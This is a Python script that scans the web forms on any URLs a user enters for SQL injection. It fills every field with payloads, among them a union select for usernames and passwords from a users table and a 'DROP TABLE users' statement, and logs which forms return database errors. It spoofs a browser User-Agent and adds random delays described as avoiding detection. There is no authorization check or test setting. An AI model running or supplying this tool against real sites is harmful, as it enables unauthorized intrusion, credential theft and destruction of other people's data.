import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import csv
import os
import time
import random

s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"

# Payloads for SQL injection attempts
payloads = [
    "'", "\"", "' OR 1=1 -- ", "' OR '1'='1' -- ",
    "' UNION SELECT null -- ", "' AND SLEEP(5) -- ",
    "' UNION SELECT username, password FROM users --",
    "'; DROP TABLE users; --"
]

def get_forms(url):
    try:
        response = s.get(url, timeout=10)
        response.raise_for_status()
        soup = BeautifulSoup(response.content, "html.parser")
        return soup.find_all("form")
    except requests.exceptions.RequestException as e:
        print(f"[-] Error fetching forms from {url}: {e}")
        return []

def form_details(form):
    detailsOfForm = {}
    action = form.attrs.get("action")
    method = form.attrs.get("method", "get").lower()
    inputs = []

    # Handle input fields
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({"type": input_type, "name": input_name, "value": input_value})

    # Handle textarea fields
    for textarea_tag in form.find_all("textarea"):
        input_name = textarea_tag.attrs.get("name")
        inputs.append({"type": "textarea", "name": input_name, "value": ""})

    # Handle select fields
    for select_tag in form.find_all("select"):
        input_name = select_tag.attrs.get("name")
        options = [option.attrs.get("value", "") for option in select_tag.find_all("option")]
        inputs.append({"type": "select", "name": input_name, "value": options[0]})  # Default to first option

    detailsOfForm['action'] = action
    detailsOfForm['method'] = method
    detailsOfForm['inputs'] = inputs
    return detailsOfForm

def vulnerable(response):
    errors = {
        "quoted string not properly terminated",
        "unclosed quotation mark after the character string",
        "you have an error in your SQL syntax",
        "sql error", "sql syntax", "warning",
        "mysql_fetch", "syntax error", "unexpected token",
        "invalid query", "near", "unterminated string literal"
    }
    for error in errors:
        if error in response.content.decode(errors="ignore").lower():
            return True
    return False

#Log vulnerabilities to CSV
def log_vulnerability(file_name, url, form_action, payload, is_vulnerable):
    with open(file_name, "a", newline="") as f:
        writer = csv.writer(f)
        writer.writerow([url, form_action, payload, "Vulnerable" if is_vulnerable else "Not Vulnerable"])

#Random delay to avoid detection
def random_delay():
    time.sleep(random.uniform(1, 5))

def sql_injection_scan(url):
    if not valid_url(url):
        print(f"[-] Invalid URL: {url}")
        return

    domain = urlparse(url).netloc.replace(".", "_")
    file_name = f"{domain}_vulnerabilities.csv"

    if not os.path.exists(file_name):
        with open(file_name, "w", newline="") as f:
            writer = csv.writer(f)
            writer.writerow(["URL", "Form Action", "Payload", "Status"])

    forms = get_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}.")
    
    for form in forms:
        details = form_details(form)
        action_url = urljoin(url, details['action'])
        
        for payload in payloads:
            data = {}
            for input_tag in details['inputs']:
                if input_tag["type"] == "hidden" or input_tag["value"]:
                    data[input_tag['name']] = input_tag["value"] + payload
                elif input_tag["type"] != "submit":
                    data[input_tag['name']] = f"test{payload}"

            # Send the form with either POST or GET
            try:
                if details["method"] == "post":
                    res = s.post(action_url, data=data, timeout=10)
                else:
                    res = s.get(action_url, params=data, timeout=10)
                
                # Check if the form is vulnerable
                is_vuln = vulnerable(res)
                log_vulnerability(file_name, url, details['action'], payload, is_vuln)
                if is_vuln:
                    print(f"[+] Vulnerable payload found: {payload} on {action_url}")
                else:
                    print(f"[-] Payload not vulnerable: {payload} on {action_url}")
            except requests.exceptions.RequestException as e:
                print(f"[-] Error testing payload on {action_url}: {e}")
            random_delay()

def valid_url(url):
    parsed = urlparse(url)
    return bool(parsed.netloc) and bool(parsed.scheme)

#Main function to scan URLs
if __name__ == "__main__":
    print("Enter the URLs to scan (comma-separated):")
    urls_to_check = input().split(',')

    # Clean and validate URLs
    urls_to_check = [url.strip() for url in urls_to_check]

    # Scan each URL
    for url in urls_to_check:
        sql_injection_scan(url)

    print("[*] Scan complete. Check the respective CSV files for results.")
